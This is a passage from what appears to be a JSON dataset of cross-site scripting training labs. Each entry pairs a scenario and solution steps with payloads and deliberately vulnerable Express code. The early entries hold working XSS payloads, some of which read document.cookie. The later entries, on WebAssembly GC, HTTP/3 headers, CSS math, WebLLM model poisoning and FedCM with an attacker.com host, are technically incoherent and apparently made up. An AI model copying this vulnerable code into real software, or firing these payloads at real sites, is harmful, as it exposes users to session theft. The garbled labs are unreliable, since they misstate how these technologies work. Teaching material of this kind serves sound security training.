      "<img src=x onerror=alert(1)>",
      "<svg onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); const history = []; app.get('/search', (req, res) => { const q = req.query.q || ''; history.push(q); res.send('Search stored'); }); app.get('/dashboard', (req, res) => { const result = history.map(q => `<div>${q}</div>`).join(''); res.send(`<html><body>${result}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Feedback Portal Stored XSS in Comment Field",
    "Lab Description": "The feedback page allows users to submit comments, which are stored and displayed without sanitization. The rendering uses innerHTML, introducing an XSS vector. To solve: Submit a script payload that executes on the feedback view page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to /feedback and submit a comment with an XSS payload.",
      "View the stored comment at /view-feedback.",
      "Inspect DOM for innerHTML usage.",
      "Trigger payload to confirm execution.",
      "Confirm successful JavaScript execution in user context."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<svg/onload=alert('XSS')>",
      "<img src=x onerror=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const feedback = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/feedback', (req, res) => { feedback.push(req.body.comment); res.redirect('/view-feedback'); }); app.get('/view-feedback', (req, res) => { const output = feedback.map(f => `<p>${f}</p>`).join(''); res.send(`<html><body>${output}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Internal Blog Platform Stored XSS in Article Title Field",
    "Lab Description": "The internal blog system allows staff to post articles with a title and content. The title is rendered directly inside an H1 tag using innerHTML on the article view page. No sanitization is performed. To solve: Submit an article with a script payload in the title that executes when viewed.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access /submit and post a new article with an XSS payload in the title.",
      "Navigate to /article?id=1 to view the article.",
      "Inspect how the title is rendered in the DOM.",
      "Confirm innerHTML is used inside H1.",
      "Trigger alert from injected payload."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const articles = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit', (req, res) => { articles.push({ title: req.body.title, content: req.body.content }); res.redirect('/article?id=1'); }); app.get('/article', (req, res) => { const a = articles[0]; res.send(`<html><body><h1 id='title'></h1><div>${a.content}</div><script>document.getElementById('title').innerHTML = \"${a.title}\";</script></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Job Portal Reflected XSS in Search Query Parameter",
    "Lab Description": "The job search page reflects the 'q' parameter inside a JavaScript variable for displaying recent searches. The value is directly inserted inside a JS string using double quotes. To solve: Inject JavaScript that breaks out of the string context.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Go to /jobs?q= with test input.",
      "Inspect page source for script using 'q' value.",
      "Confirm reflection inside quoted string in JS block.",
      "Craft payload that breaks out of the quote context.",
      "Trigger alert in the browser."
    ],
    "payloads": [
      "\";alert('XSS');//",
      "';alert(1);//",
      "`;alert(document.cookie)//"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/jobs', (req, res) => { const q = req.query.q || ''; res.send(`<html><head><script>var search = \"${q}\";</script></head><body></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "E-learning Portal Stored XSS in Forum Post Body",
    "Lab Description": "The forum feature stores user-submitted posts and displays them on the thread page using innerHTML. The post body is stored and rendered without any sanitization. To solve: Submit a post with a script payload that executes on viewing.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a new post via /forum-post with a malicious body.",
      "Navigate to /thread?id=1 to view it.",
      "Inspect the DOM and confirm innerHTML rendering.",
      "Trigger alert to confirm execution.",
      "Validate JavaScript runs in the page context."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<svg/onload=alert(1)>",
      "<img src=x onerror=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const threads = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/forum-post', (req, res) => { threads.push(req.body.body); res.redirect('/thread?id=1'); }); app.get('/thread', (req, res) => { res.send(`<div id='post'></div><script>document.getElementById('post').innerHTML = \"${threads[0]}\";</script>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Customer Support Ticket System Stored XSS in Ticket Subject",
    "Lab Description": "Support tickets store a subject and message. The subject is displayed inside an HTML header using innerHTML when the ticket is viewed. No filtering is applied. To solve: Submit a malicious subject and trigger XSS on the view page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a new ticket at /ticket with an XSS payload in the subject.",
      "Access /view-ticket?id=1 to trigger rendering.",
      "Inspect header rendering of subject.",
      "Confirm DOM uses innerHTML with unsanitized input.",
      "Trigger payload in browser."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const tickets = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/ticket', (req, res) => { tickets.push({ subject: req.body.subject, body: req.body.body }); res.redirect('/view-ticket?id=1'); }); app.get('/view-ticket', (req, res) => { const t = tickets[0]; res.send(`<h2 id='sub'></h2><p>${t.body}</p><script>document.getElementById('sub').innerHTML = \"${t.subject}\";</script>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "News Aggregator DOM XSS via Source Parameter",
    "Lab Description": "The news aggregator site reflects the `source` query param in a JS template literal that updates the filter UI. No escaping is performed. To solve: Inject a payload that executes within the JS template context.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Visit /news?source= and inject test payload.",
      "Inspect JavaScript block where source is reflected.",
      "Confirm injection in a JS template literal.",
      "Craft payload using backticks to inject JS.",
      "Verify execution with alert popup."
    ],
    "payloads": [
      "`;alert('XSS')//",
      "${alert(document.cookie)}",
      "`-alert(1)-`"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/news', (req, res) => { const source = req.query.source || 'global'; res.send(`<html><head><script>let src = \"${source}\";</script></head><body>News</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Real Estate Listings Reflected XSS in Search Filter",
    "Lab Description": "The listings page includes a `location` parameter reflected inside an inline JavaScript assignment within a template literal. The application uses the parameter to highlight recent searches but does not sanitize input. To solve: Inject a payload that breaks out of the JS context and executes a script.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Go to /listings?location= and supply test payloads.",
      "Inspect JavaScript block for reflection of location param.",
      "Confirm injection is inside a template literal string.",
      "Craft payload using backticks or JS expressions.",
      "Trigger alert to confirm code execution."
    ],
    "payloads": [
      "`;alert('XSS')//",
      "${alert(1)}",
      "`-alert(document.cookie)-`"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/listings', (req, res) => { const location = req.query.location || 'anywhere'; res.send(`<html><head><script>const loc = \"${location}\";</script></head><body>Search</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Social Media Platform Stored XSS in Comment Field",
    "Lab Description": "User-submitted comments are stored and displayed beneath each post using innerHTML. No output sanitization is performed. This allows stored JavaScript payloads to execute for all users viewing the comment. To solve: Submit a malicious comment that triggers script execution when the post is viewed.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a comment with an XSS payload using /comment.",
      "Access the post page at /post?id=1.",
      "Inspect how comments are rendered in DOM.",
      "Confirm innerHTML is used without escaping.",
      "Trigger alert when page loads."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert(document.cookie)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const comments = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/comment', (req, res) => { comments.push(req.body.text); res.redirect('/post?id=1'); }); app.get('/post', (req, res) => { res.send(`<div id='cmt'></div><script>document.getElementById('cmt').innerHTML = \"${comments[0]}\";</script>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "E-Commerce Dashboard DOM XSS via Username in Dashboard Widget",
    "Lab Description": "The admin dashboard displays the logged-in user's name using `innerHTML` to personalize a widget. The name is set via a cookie and injected into the DOM without sanitization. To solve: Set a malicious cookie value that leads to code execution.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use a browser extension or JS to set a crafted cookie: username=<payload>.",
      "Visit /dashboard and observe DOM rendering.",
      "Check how username is reflected via innerHTML.",
      "Confirm script execution from payload.",
      "Trigger alert on widget load."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/dashboard', (req, res) => { const name = req.cookies.username || 'Guest'; res.send(`<div id='welcome'></div><script>document.getElementById('welcome').innerHTML = \"${name}\";</script>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Helpdesk Application Reflected XSS in Ticket Filter Parameter",
    "Lab Description": "The helpdesk UI includes a search filter using the `status` query parameter. This value is reflected directly inside a JavaScript variable using quotes. The reflection is not escaped, allowing arbitrary JS execution. To solve: Craft a payload that breaks out of the quoted string.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to /tickets?status= with payloads.",
      "View page source and inspect how `status` is reflected.",
      "Note injection inside quoted JS variable.",
      "Craft payload using closing quote and JS injection.",
      "Trigger alert to verify."
    ],
    "payloads": [
      "\";alert(1);//",
      "';alert('XSS');//",
      "\"-alert(document.domain)-\""
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/tickets', (req, res) => { const status = req.query.status || 'open'; res.send(`<html><script>var s = \"${status}\";</script><body>Tickets</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Online Learning System Stored XSS in Feedback Field",
    "Lab Description": "The course feedback form stores submitted content in memory and displays it using `innerHTML` in the review section. No sanitization or escaping is applied. To solve: Submit a malicious script in the feedback field that executes upon rendering.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback at /submit-feedback with XSS payload.",
      "Access /reviews to view the rendered feedback.",
      "Inspect the DOM for innerHTML usage.",
      "Confirm payload executes when content is loaded.",
      "Trigger alert from malicious content."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<svg onload=alert(1)>",
      "<img src=x onerror=alert(document.cookie)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const feedback = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-feedback', (req, res) => { feedback.push(req.body.text); res.redirect('/reviews'); }); app.get('/reviews', (req, res) => { res.send(`<div id='fb'></div><script>document.getElementById('fb').innerHTML = \"${feedback[0]}\";</script>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Event Management Portal Reflected XSS in Search Field",
    "Lab Description": "The event search functionality uses a `query` parameter that is reflected inside a script block using double quotes. No input sanitization is applied before rendering, creating a JavaScript injection point. To solve: Inject a payload that breaks out of the quoted string and triggers script execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access /events?query= and try basic payloads.",
      "Check page source for how the value is used in JS.",
      "Identify injection inside quoted variable assignment.",
      "Craft payload using `\";payload//` syntax.",
      "Trigger alert to confirm successful XSS."
    ],
    "payloads": [
      "\";alert('XSS')//",
      "';alert(1);//",
      "\"-alert(document.cookie)-\""
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/events', (req, res) => { const query = req.query.query || ''; res.send(`<html><script>var q = \"${query}\";</script><body>Events</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Travel Booking Site Stored XSS in Destination Review",
    "Lab Description": "User-submitted reviews for destinations are stored and rendered using `innerHTML` without any sanitization. This allows persistent JavaScript code to execute for other users viewing the destination. To solve: Submit a review that contains executable JavaScript.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST a review at /submit-review with a script payload.",
      "Visit /destination?id=1 to view reviews.",
      "Inspect how the review is injected into the DOM.",
      "Confirm use of `innerHTML` for rendering.",
      "Check for alert execution upon page load."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(document.domain)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const reviews = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-review', (req, res) => { reviews.push(req.body.text); res.redirect('/destination?id=1'); }); app.get('/destination', (req, res) => { res.send(`<div id='reviews'></div><script>document.getElementById('reviews').innerHTML = \"${reviews[0]}\";</script>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Internal Admin Tool DOM XSS via URL Fragment Injection",
    "Lab Description": "The admin dashboard reads the hash value from `location.hash` and injects it into the DOM using `innerHTML`. The application does not sanitize or validate the hash value, making it exploitable through fragment-based DOM XSS. To solve: Craft a malicious hash payload that executes arbitrary JavaScript.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Navigate to /admin#<payload> in browser.",
      "Inspect how `location.hash` is used in JS.",
      "Verify `innerHTML` injection without sanitization.",
      "Craft payload like `<img src=x onerror=alert(1)>`.",
      "Ensure alert is triggered from hash content."
    ],
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert(document.cookie)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/admin', (req, res) => { res.send(`<div id='hash'></div><script>document.getElementById('hash').innerHTML = location.hash.slice(1);</script>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Community Forum Reflected XSS in Tag Parameter",
    "Lab Description": "The forum's post listing page reflects the `tag` query parameter inside an inline `<script>` tag. The value is embedded inside a template literal and used to highlight matching posts. Lack of escaping allows JavaScript injection. To solve: Inject a payload that executes JavaScript in this context.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Visit /posts?tag= with test payloads.",
      "Inspect script block for template literal injection.",
      "Craft payload using backticks and template escape.",
      "Trigger alert to confirm successful injection.",
      "Validate execution occurs inside `<script>` context."
    ],
    "payloads": [
      "`;alert('XSS')//",
      "${alert(1)}",
      "`-alert(document.domain)-`"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/posts', (req, res) => { const tag = req.query.tag || ''; res.send(`<html><head><script>let t = \"${tag}\";</script></head><body>Forum</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Survey Application Stored XSS in Name Field",
    "Lab Description": "Survey submissions store user names which are later displayed in a leaderboard using `innerHTML`. Since user input is stored and not sanitized, this leads to stored XSS for any viewer of the leaderboard. To solve: Submit a payload as the name that runs JavaScript upon viewing.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit name at /submit-survey with an XSS payload.",
      "Visit /leaderboard to view stored submissions.",
      "Inspect how the name is injected into the DOM.",
      "Confirm use of `innerHTML` without sanitization.",
      "Check if payload executes as stored content loads."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert('Pwned')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const entries = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-survey', (req, res) => { entries.push(req.body.name); res.redirect('/leaderboard'); }); app.get('/leaderboard', (req, res) => { res.send(`<div id='names'></div><script>document.getElementById('names').innerHTML = \"${entries[0]}\";</script>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Online Shop Reflected XSS in Discount Code Field",
    "Lab Description": "The discount code entered in the checkout page is reflected into an inline script using double quotes. No sanitization is applied, allowing attackers to inject JavaScript directly into the script context. To solve: Inject a payload that escapes the quote and executes a script.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to /checkout?code= and observe reflection.",
      "View page source to confirm script context.",
      "Notice double quotes wrapping injected value.",
      "Craft payload using `\";alert(1)//` pattern.",
      "Confirm payload triggers JavaScript execution."
    ],
    "payloads": [
      "\";alert(1)//",
      "';alert(document.domain)//",
      "\"-alert('XSS')-\""
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/checkout', (req, res) => { const code = req.query.code || ''; res.send(`<html><script>var discount = \"${code}\";</script><body>Apply discount</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Issue Tracker Stored XSS in Comment Field",
    "Lab Description": "The issue tracking system allows users to post comments. These comments are displayed using `innerHTML` without escaping, leading to stored XSS. To solve: Submit a comment with an XSS payload and visit the issue page to trigger it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "POST a comment at /submit-comment with an XSS payload.",
      "Visit /issue?id=1 to load stored comments.",
      "Inspect DOM to confirm use of `innerHTML`.",
      "Check payload rendering in the page source.",
      "Verify script execution on page load."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(document.cookie)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const comments = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/submit-comment', (req, res) => { comments.push(req.body.text); res.redirect('/issue?id=1'); }); app.get('/issue', (req, res) => { res.send(`<div id='comments'></div><script>document.getElementById('comments').innerHTML = \"${comments[0]}\";</script>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Fitness App Reflected XSS in Progress Tracker Filter",
    "Lab Description": "The `filter` parameter is used in the client-side chart script. It is inserted unescaped inside a JavaScript variable. The application lacks validation or escaping, making it vulnerable to reflected XSS. To solve: Inject a payload that escapes the JS context and executes code.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Open /progress?filter= with test payloads.",
      "Inspect how value is used inside `<script>`.",
      "Observe JS variable assignment from filter param.",
      "Inject using backtick or quote-breaking syntax.",
      "Trigger alert to confirm XSS."
    ],
    "payloads": [
      "`;alert('XSS')//",
      "\";alert(1)//",
      "${alert(document.domain)}"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/progress', (req, res) => { const filter = req.query.filter || ''; res.send(`<html><head><script>var f = \"${filter}\";</script></head><body>Progress</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Restaurant Review Portal Stored XSS in Feedback Message",
    "Lab Description": "Users can leave feedback messages that are rendered on the homepage using `innerHTML`. The feedback is saved and shown to all visitors without sanitization. To solve: Submit a feedback message containing a script payload to trigger stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback at /feedback with script payload.",
      "Visit homepage / to see stored feedback.",
      "Inspect rendering inside the HTML source.",
      "Verify `innerHTML` is used to display feedback.",
      "Ensure payload execution when page loads."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('X')>",
      "<svg/onload=alert(document.domain)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const feedback = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/feedback', (req, res) => { feedback.push(req.body.message); res.redirect('/'); }); app.get('/', (req, res) => { res.send(`<div id='fb'></div><script>document.getElementById('fb').innerHTML = \"${feedback[0]}\";</script>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Online Learning Platform Reflected XSS in Course Title Preview",
    "Lab Description": "The preview page reflects the `title` parameter directly into a JavaScript variable in an inline script tag. This parameter is not encoded or escaped, creating a JS context injection vulnerability. To solve: Inject a payload that breaks out of the string and executes JavaScript.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Access /preview?title= with a test value.",
      "Inspect `<script>` block to confirm JS context injection.",
      "Note that title is reflected inside double quotes.",
      "Inject with a quote-breaking XSS payload.",
      "Verify alert execution after injection."
    ],
    "payloads": [
      "\";alert('XSS')//",
      "';alert(1);//",
      "`;alert(document.domain)//"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/preview', (req, res) => { const title = req.query.title || ''; res.send(`<html><script>var courseTitle = \"${title}\";</script><body>Preview</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "WebAssembly GC XSS in Blockchain Smart Contract Debugger",
    "Lab Description": "Solidity IDE visualizes contract memory with WebAssembly GC type mismatches. The application renders garbage-collected heap data via innerHTML without validation. To solve: Corrupt GC references to inject HTML through malformed type arrays.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Compile malicious contract with wasm-gc toolchain",
      "Craft payload: (type $XSS (struct (field (mut (ref null $XSS))))",
      "Bypass type validation via recursive struct definitions",
      "Chain with multi-memory proposals",
      "Verify through Etherscan-like debugger"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "new Array(1024).fill('\\u003Cscript\\u003Ealert(1)')",
      "externref.fromJSValue(document.body)"
    ],
    "srcCode": "const instance = await WebAssembly.instantiate(gcWasm);\ndocument.getElementById('heap').innerHTML = \n  JSON.stringify(instance.exports.memory); // Vulnerable"
  },
  {
    "Lab scenario": "HTTP/3 Extended CONNECT XSS in IoT Over-the-Air Updates",
    "Lab Description": "Smart device manager uses HTTP/3 Extended CONNECT for firmware patches with reflection in admin UI. The application processes CONNECT-UDP handshakes via unescaped console.log(). To solve: Inject XSS through crafted :protocol pseudo-headers.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Craft CONNECT-UDP request with ngtcp2",
      "Inject payload: :protocol: </script><svg/onload=alert(1)>",
      "Bypass QPACK encoding using literal headers",
      "Automate with curl --http3-prior-knowledge",
      "Verify through device management portal"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "GET / HTTP/3\n:protocol: javascript:alert(1)\n\n",
      "priority: u=3, i=\";<script>alert(1)</script>\""
    ],
    "srcCode": "app.use((req, res) => {\n  console.log(`Protocol: ${req.headers[':protocol']}`); // Vulnerable\n});"
  },
  {
    "Lab scenario": "CSS Math Function XSS in Financial Forecasting Dashboard",
    "Lab Description": "Stock prediction tool implements CSS calc() with unsafe var(--user-input) handling. The application allows mathematical expressions in CSSOM via insertRule(). To solve: Break style context through trigonometric function abuse.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify CSS injection via Computed Styles panel",
      "Craft payload: --x: cos(</style><script>alert(1)</script>);",
      "Bypass sanitizer using env(safe-area-inset-*)",
      "Chain with @property registered custom properties",
      "Verify through PDF report generation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "width: calc(var(--x) * 1px + </style><svg/onload=alert(1)>);",
      "@property --x { syntax: '<string>'; inherits: true; initial-value: \"\\3C script\\3E\" }"
    ],
    "srcCode": "const sheet = new CSSStyleSheet();\nsheet.replaceSync(`:root { ${userVars} }`); // Vulnerable"
  },
  {
    "Lab scenario": "WebNFC Tag Spoofing XSS in Retail Inventory System",
    "Lab Description": "Smart shelf system scans NFC tags with vulnerable NDEF record processing. The application renders product URLs via innerHTML without sanitization. To solve: Spoof NFC tags with javascript: payloads in NDEF Text records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Program NFC tag using PN532 module",
      "Craft payload: NDEF Text: javascript:alert(document.domain)",
      "Bypass URL validation using UTF-16 encoding",
      "Automate with WebNFC polyfill",
      "Verify through mobile PWA interface"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"records\":[{\"recordType\":\"text\",\"data\":\"javascript:alert(1)\"}]}",
      "nfc.write('javascript:/*%00*/alert(1)')"
    ],
    "srcCode": "navigator.nfc.watch((message) => {\n  document.getElementById('product').innerHTML = \n    message.records[0].data; // Vulnerable\n});"
  },
  {
    "Lab scenario": "SVG Animation Timeline XSS in Video Editing Suite",
    "Lab Description": "Non-linear editor implements SVG animations with unsafe begin/end attribute handling. The application uses document.timeline with user-controlled time values. To Solve: Trigger XSS through crafted beginElement() calls.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept animation keyframe data",
      "Craft payload: <animate begin='javascript:alert(1)'/>",
      "Bypass sanitizer using SMIL timing syntax",
      "Chain with requestAnimationFrame() callbacks",
      "Verify through video preview rendering"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<animate attributeName='href' values='javascript:alert(1)' begin='1s'/>",
      "<set attributeName='xlink:href' to='javascript:alert(1)'/>"
    ],
    "srcCode": "document.timeline.play(new Animation(\n  new KeyframeEffect(svgElement, userKeyframes) // Vulnerable\n));"
  },
  {
    "Lab scenario": "XSS in WebLLM Chat Interface via Model Poisoning",
    "Lab Description": "AI chat platform uses WebLLM with unsafe tensor metadata handling. The application reflects model output tokens in DOM via innerHTML. To solve: Craft malicious LoRA adapter weights to force model output HTML payloads.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept model loading via Service Worker",
      "Inject payload: {\"embeddings\": [60, 115, 99, ...]} (ASCII for <script>)",
      "Bypass quantization checks using fp16 precision",
      "Automate with ONNX Runtime Web",
      "Verify through chat response rendering"
    ],
    "payloads": [
      "model_output = '<script>alert(1)</script>'",
      "tensor([[60,115,99],[114,105,112],[116,62]])"
    ],
    "srcCode": "const model = await WebLLM.loadModel(userUpload);\ndocument.body.innerHTML += model.generateResponse(prompt);"
  },
  {
    "Lab scenario": "CSS Animation Worklet XSS in Trading Platform",
    "Lab Description": "Stock charting tool implements Animation Worklet with unsafe input to workletGlobalScope. The application passes user-controlled parameters via registerAnimator(). To solve: Break JS execution context through worklet prototype pollution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify worklet registration via Sources panel",
      "Craft payload: class XSSAnimator { animate(currentTime, effect) { alert(1) } }",
      "Bypass CSP using worklet module loading",
      "Chain with AudioWorklet global scope",
      "Verify through candlestick chart rendering"
    ],
    "payloads": [
      "CSS.animationWorklet.addModule('data:text/javascript,alert(1)')",
      "registerAnimator('xss', class { constructor() { alert(1) } })"
    ],
    "srcCode": "await CSS.animationWorklet.addModule(`class XSS { ${userCode} }`);"
  },
  {
    "Lab scenario": "WebAssembly Exception Handling XSS in Code Sandbox",
    "Lab Description": "Online IDE implements Wasm exceptions with unsafe tag reflection. The application displays exception messages via textContent with CSS unescape. To solve: Abuse exception tag IDs to reconstruct script tags.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Compile Wasm with custom exception tags",
      "Craft payload: (exception $XSS (param i32) (i32.const 0x3C736372))",
      "Bypass tag validation using multi-memory",
      "Chain with garbage collection hooks",
      "Verify through debug console output"
    ],
    "payloads": [
      "throw new WebAssembly.Exception($XSS, [0x3C736372])",
      "catch ($XSS => String.fromCharCode(...args))"
    ],
    "srcCode": "try { instance.exports.run(); } catch (e) {\n  debugConsole.textContent = e; // Vulnerable CSS unescape\n}"
  },
  {
    "Lab scenario": "FedCM API XSS in Passwordless Auth Flow",
    "Lab Description": "WebAuthn alternative using FedCM reflects IDP responses in hidden iframes. The application processes asserted claims via postMessage without validation. To solve: Bypass same-origin policy via IDP origin spoofing.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Spoof IDP endpoint via DNS rebinding",
      "Craft payload: postMessage('<img/src=//xss>', '*')",
      "Bypass FedCM manifest checks using CNAME cloaking",
      "Automate with Puppeteer FedCM API",
      "Verify through OAuth callback"
    ],
    "payloads": [
      "IdentityProviderConfig: { clientId: '<script>' }",
      "navigator.credentials.get({ identity: { provider: '//attacker.com' } })"
    ],
    "srcCode": "const credential = await navigator.credentials.get({\n  identity: { provider: idpURL } // Vulnerable\n});"
  },
  {
    "Lab scenario": "SVG Font XSS in EPUB Reader",
    "Lab Description": "E-book reader renders custom fonts via SVG <textPath> without sanitization. The application allows @font-face rules from untrusted EPUBs. To solve: Achieve XSS through crafted SVG font glyph definitions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create malicious EPUB using Sigil",
      "Inject payload: <font><glyph unicode='X' d='M0 0'/><hkern g1='X' g2='<script>'/>",
      "Bypass MIME validation using polyglot EPUB/ZIP",
      "Chain with CSS font-feature-settings",
      "Verify through reader's annotation system"
    ],
    "payloads": [
      "<textPath xlink:href='javascript:alert(1)'>",
      "@font-face { font-family:x; src:url('data:image/svg+xml,<svg/>...'); }"
    ],
    "srcCode": "epub.renderPage(content => {\n  readerDiv.innerHTML = content; // Vulnerable\n});"
  },
  {
    "Lab scenario": "WebAssembly Component Model XSS in Data Processing Pipeline",
    "Lab Description": "Analytics platform processes WASM components with unsafe interface type reflection. The application renders component exports via innerHTML using JSON.stringify(). To solve: Inject HTML through malformed UTF-8 in component adapter strings.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Compile malicious component using wasm-tools",
      "Craft payload: (adapter utf8 \"\\x3Cscript>alert(1)</script>\")",
      "Bypass UTF-8 validation using WTF-8 encoding",
      "Chain with shared-nothing linking model",
      "Verify via component registry dashboard"
    ],
    "payloads": [
      "(component (export \"\\u{1F4AF}<script>\" (func)))",
      "data:application/wasm-component;base64,CmFkYXB0ZXIg..."
    ],
